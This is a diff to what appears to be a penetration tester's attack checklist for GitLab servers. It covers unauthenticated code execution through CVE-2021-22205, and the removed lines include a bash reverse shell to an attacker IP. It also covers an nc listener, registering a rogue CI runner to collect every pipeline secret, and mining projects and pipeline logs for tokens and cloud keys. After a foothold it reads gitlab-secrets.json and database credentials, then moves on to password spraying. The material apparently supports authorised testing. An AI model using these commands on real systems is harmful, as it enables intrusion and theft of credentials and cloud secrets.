@@ -1,31 +1,35 @@
 # GitLab
 
 ## Before I start
-- [ ] Version first: curl -s http://target/users/sign_in | grep -oP 'content="[0-9.]+"'
-- [ ] 11.9 ≤ v < 13.8.8 / 13.9.6 / 13.10.3 → CVE-2021-22205 unauth RCE, skip everything else
+- [ ] The version first: /help once logged in, or /api/v4/version with a token
+- [ ] From 11.9 up to, but not including, 13.8.8, 13.9.6 and 13.10.3: CVE-2021-22205, a shell with no login, before anything else
 
-## CVE-2021-22205 (ExifTool DjVu)
-searchsploit gitlab 13
-python3 CVE-2021-22205.py -t http://target -c 'id'
-python3 CVE-2021-22205.py -t http://target -c 'bash -c "bash -i >& /dev/tcp/<AttackerIP>/443 0>&1"'
-- [ ] Pre-auth, runs as git user — one of the few version-match = shell CVEs
+## CVE-2021-22205, ExifTool on an uploaded image
+searchsploit gitlab 13.10
+searchsploit -m <EdbID>
+rlwrap nc -lvnp <LPORT>
+- [ ] The exploit read first for its options, then run with a reverse shell line as its command: :Pb public-exploits, :Pb shells
+- [ ] No login needed, and the shell is the git user
 
-## No CVE path
-- [ ] Registration open → account → internal-visibility projects readable
-- [ ] User enum: /api/v4/users?username=root
-- [ ] Mine projects/snippets/wikis: .env, glpat- tokens, Terraform state with cloud keys
-- [ ] Pipeline logs print "masked" CI variables surprisingly often
+## Without the CVE
+- [ ] Registration open: an account reads the projects marked internal
+- [ ] Users by name: /api/v4/users?username=root
+- [ ] Projects, snippets and wikis read for .env files, glpat- tokens and Terraform state with cloud keys
+- [ ] Pipeline logs, which often print CI variables that were meant to be masked
 
-## Rogue runner
-gitlab-runner register --url http://target --token <RegToken> --executor docker
-- [ ] Push a job that exfils env: every CI secret (AWS, kubeconfig, deploy passwords) → my listener
+## A runner of my own
+gitlab-runner, installed as https://docs.gitlab.com/runner/install/ says, with THE-REGISTRATION-TOKEN from a project's or the instance's runner settings:
+gitlab-runner register --url <Scheme>://<WebHost> --registration-token THE-REGISTRATION-TOKEN --executor docker
+- [ ] A runner authentication token, one that starts glrt-, goes in --token instead
+- [ ] A job my runner picks up hands it every CI secret that job uses: cloud keys, kubeconfigs and deploy passwords
 
-## Post-foothold loot (as git)
+## After a shell
 cat /etc/gitlab/gitlab.rb
 cat /etc/gitlab/gitlab-secrets.json
-- [ ] DB creds, LDAP bind password, secret_key_base, CI variable encryption keys
-- [ ] gitlabhq_production: bcrypt users, tokens, runner tokens
+- [ ] Both are root's: as git, the same values are in /var/opt/gitlab/gitlab-rails/etc/, in database.yml, secrets.yml and gitlab.yml
+- [ ] Database credentials, the LDAP bind password, secret_key_base and the keys that encrypt CI variables
+- [ ] The gitlabhq_production database: bcrypt user hashes, tokens and runner tokens
 
 ## Next
-- [ ] Cloud keys → AWS/cloud enum (note: Attacking AWS page)
-- [ ] LDAP bind creds → :Pb spraying / :Pb domain-enum
+- [ ] Cloud keys: the cloud account they open
+- [ ] LDAP bind credentials: :Pb spraying, :Pb domain-enum
